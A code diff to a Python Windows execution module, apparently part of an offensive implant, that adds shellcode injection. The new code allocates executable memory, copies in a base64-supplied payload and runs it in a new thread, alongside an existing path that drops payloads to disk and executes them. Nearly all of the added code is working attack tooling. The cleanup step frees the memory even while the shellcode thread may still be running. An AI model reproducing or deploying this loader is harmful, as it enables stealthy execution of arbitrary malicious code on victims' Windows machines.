@@ -8,6 +8,9 @@ import re # For caret obfuscation
 import stat # For chmod
 import uuid
 import shlex
+import ctypes
+from ctypes import wintypes
+import win32con # Using constants from win32con
 from typing import Dict, Any, List, Tuple, Optional
 from datetime import datetime
 
@@ -56,9 +59,12 @@ class WindowsExecution:
         
         cmd_list_or_str = command # Default to passing string if use_shell=True
         if not use_shell:
-            # Basic split, assumes command is executable path + args
-            # TODO: Improve argument handling, potentially use shlex for specific cases?
-            cmd_list_or_str = command.split() 
+            # Use shlex.split for robust parsing of commands with quotes/spaces
+            try:
+                 cmd_list_or_str = shlex.split(command, posix=False) # posix=False for Windows-style quoting
+            except ValueError as e:
+                 logger.warning(f"shlex.split failed for command '{command}': {e}. Falling back to basic split.")
+                 cmd_list_or_str = command.split() # Fallback
 
         logger.info(f"Executing Windows command (shell={effective_shell if use_shell else 'None'}, use_shell={use_shell}): {command}")
 
@@ -238,11 +244,12 @@ class WindowsExecution:
 
     # --- Payload Execution Handler ---
     def _handle_payload_execution(self, data: Dict[str, Any]) -> Dict[str, Any]:
-        """Handles Windows payload execution."""
+        """Handles Windows payload execution via disk or memory."""
         content_b64 = data.get("content_b64")
         method = data.get("method") # disk, memory
         file_extension = data.get("file_extension", ".exe") # Default to exe on windows
         args = data.get("args", [])
+        wait_timeout_ms = data.get("wait_timeout_ms", 5000) # Timeout for waiting on memory thread
 
         if not content_b64 or not method:
             return {"status": "failure", "reason": "Missing content_b64 or method for payload execution."}
@@ -257,13 +264,14 @@ class WindowsExecution:
         result_details = {
             "execution_method": method,
             "payload_size_bytes": len(payload_bytes),
-            "args_provided": args,
+            "args_provided": args, # Note: Args typically not directly usable for shellcode injection
         }
+        if method == "memory":
+             result_details["wait_timeout_ms"] = wait_timeout_ms
 
         if method == "disk":
             temp_file_path = None
             try:
-                # Use user's temp dir
                 temp_dir = tempfile.gettempdir()
                 temp_file_name = f"bf_{uuid.uuid4().hex}{file_extension}"
                 temp_file_path = os.path.join(temp_dir, temp_file_name)
@@ -273,7 +281,7 @@ class WindowsExecution:
                 logger.info(f"Payload written to temporary file: {temp_file_path}")
 
                 command_parts = [temp_file_path] + args
-                command_str = " ".join(f'"{part}"' for part in command_parts) # Quote parts
+                command_str = " ".join(f'"{part}"' for part in command_parts)
 
                 return_code, stdout, stderr = self._run_command(command_str, shell=None, use_shell=False, capture=True)
 
@@ -300,11 +308,102 @@ class WindowsExecution:
                         logger.warning(f"Failed to cleanup temporary file {temp_file_path}: {e_clean}")
 
         elif method == "memory":
-            # Placeholder for Windows memory execution (e.g., shellcode injection)
-            logger.warning(f"Windows payload execution method '{method}' is not implemented.")
-            status = "not_implemented"
-            reason = "Windows memory execution is not implemented."
-            result_details["reason"] = reason
+            self.logger.info(f"Attempting memory execution (shellcode injection) for {len(payload_bytes)} bytes.")
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            allocated_mem = None
+            thread_handle = None
+
+            try:
+                # 1. Allocate memory
+                MEM_COMMIT = 0x1000
+                MEM_RESERVE = 0x2000
+                PAGE_EXECUTE_READWRITE = 0x40
+                payload_len = len(payload_bytes)
+
+                kernel32.VirtualAlloc.restype = wintypes.LPVOID
+                kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
+                allocated_mem = kernel32.VirtualAlloc(None, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+
+                if not allocated_mem:
+                    error_code = ctypes.get_last_error()
+                    raise OSError(f"VirtualAlloc failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
+                
+                logger.debug(f"Allocated executable memory at address: {allocated_mem:#0x}")
+                result_details["memory_address"] = f"{allocated_mem:#0x}"
+
+                # 2. Copy shellcode to allocated memory
+                # Create buffer from python bytes
+                shellcode_buffer = (ctypes.c_char * payload_len).from_buffer_copy(payload_bytes)
+                bytes_written = ctypes.c_size_t(0)
+                # Using WriteProcessMemory on current process handle (-1)
+                kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+                current_process = -1 # Pseudo handle for current process
+                if not kernel32.WriteProcessMemory(current_process, allocated_mem, shellcode_buffer, payload_len, ctypes.byref(bytes_written)):
+                    error_code = ctypes.get_last_error()
+                    raise OSError(f"WriteProcessMemory failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
+                
+                if bytes_written.value != payload_len:
+                     raise MemoryError(f"Failed to write entire shellcode. Wrote {bytes_written.value}/{payload_len} bytes.")
+                
+                logger.debug(f"Copied {bytes_written.value} bytes of shellcode to allocated memory.")
+
+                # 3. Create thread to execute shellcode
+                thread_id = wintypes.DWORD(0)
+                kernel32.CreateThread.restype = wintypes.HANDLE
+                kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
+                thread_handle = kernel32.CreateThread(None, 0, allocated_mem, None, 0, ctypes.byref(thread_id))
+
+                if not thread_handle:
+                    error_code = ctypes.get_last_error()
+                    raise OSError(f"CreateThread failed with error code {error_code}: {ctypes.WinError(error_code)[1]}")
+                
+                result_details["thread_id"] = thread_id.value
+                logger.info(f"Created thread (ID: {thread_id.value}) to execute shellcode at {allocated_mem:#0x}.")
+
+                # 4. Wait for thread to finish (optional)
+                if wait_timeout_ms > 0:
+                    logger.debug(f"Waiting for thread {thread_id.value} to complete (timeout: {wait_timeout_ms}ms)...")
+                    kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+                    wait_result = kernel32.WaitForSingleObject(thread_handle, wait_timeout_ms)
+                    result_details["wait_result"] = wait_result # 0=Signaled, 258=TIMEOUT
+                    if wait_result == 0:
+                         logger.info(f"Thread {thread_id.value} completed.")
+                         status = "success"
+                         reason = "Shellcode executed successfully via CreateThread."
+                    elif wait_result == win32con.WAIT_TIMEOUT: # Use constant
+                         logger.warning(f"Wait for thread {thread_id.value} timed out after {wait_timeout_ms}ms.")
+                         status = "success" # Consider timeout as success for long-running shellcode
+                         reason = f"Shellcode thread created, but wait timed out after {wait_timeout_ms}ms."
+                    else:
+                         logger.error(f"WaitForSingleObject returned unexpected status: {wait_result}")
+                         reason = f"Wait for thread failed with status {wait_result}."
+                else:
+                    status = "success"
+                    reason = "Shellcode thread created successfully (no wait requested)."
+                    logger.info(reason)
+
+            except (OSError, MemoryError) as e:
+                reason = f"Memory execution failed: {e}"
+                logger.error(reason, exc_info=True)
+                status = "failure"
+            except Exception as e:
+                reason = f"Unexpected error during memory execution: {e}"
+                logger.error(reason, exc_info=True)
+                status = "failure"
+            finally:
+                # 5. Cleanup
+                if thread_handle:
+                    kernel32.CloseHandle(thread_handle)
+                    logger.debug("Closed thread handle.")
+                if allocated_mem:
+                    MEM_RELEASE = 0x8000
+                    kernel32.VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
+                    if kernel32.VirtualFree(allocated_mem, 0, MEM_RELEASE):
+                         logger.debug(f"Freed allocated memory at {allocated_mem:#0x}.")
+                    else:
+                         error_code = ctypes.get_last_error()
+                         logger.warning(f"VirtualFree failed for address {allocated_mem:#0x}. Error code: {error_code}: {ctypes.WinError(error_code)[1]}")
+                         if reason: reason += " | Warning: Failed to free memory."
 
         else:
              reason = f"Unsupported payload execution method: {method}"
